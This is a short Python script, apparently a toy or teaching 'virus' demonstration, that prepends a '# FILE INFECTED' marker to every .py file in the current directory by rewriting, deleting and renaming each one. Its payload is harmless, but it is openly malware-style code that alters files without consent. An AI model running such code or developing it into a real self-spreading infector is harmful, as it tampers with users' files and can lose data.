# FILE INFECTED
import os 
import glob


filenames = glob.glob('*.py')

for filename in filenames:
	with open(filename,'r') as script:
	
		# Write to a new file, instead of reading the whole  
		# file into memory, to avoid issues with large files
		
		with open(f'{filename}.infected','w') as infected: 
		
			infection = '# FILE INFECTED\n'
			
			infected.write(infection)
			
			while(True):
				content = script.readline()
				infected.write(content)
				if not content:
					break
	os.remove(filename)
	os.rename(f'{filename}.infected', filename)
